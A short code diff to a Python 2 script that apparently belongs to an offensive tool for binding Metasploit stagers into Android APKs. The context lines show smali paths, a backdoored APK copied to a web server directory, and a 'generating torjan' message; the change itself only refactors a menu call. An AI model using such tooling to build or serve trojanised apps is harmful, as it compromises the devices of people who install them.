@@ -3,6 +3,8 @@
 # https://t.me/unk9vvn
 # AVI
 from core.menu import *
+from core.eng_menu import _eng_menu
+
 
 
 rnd = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
@@ -37,6 +39,7 @@ out10 = out1 + '/AndroidManifest.xml'
 meta1 = out1 + '/smali/com/' + rand1 + '/' + rand2 + '/'
 meta2 = out2 + '/smali/com/metasploit/stage/'
 NPAY = tmp + 'nampay.txt'
+
 
 
 def _binder():
@@ -287,6 +290,5 @@ def _binder():
     subprocess.call(
         'cp ' + CLS_RN + '-b.apk /var/www/html/',
         shell=True)
-    menu().eng_menu()
     print "[i] generating torjan /root"
-    pass
+    _eng_menu()
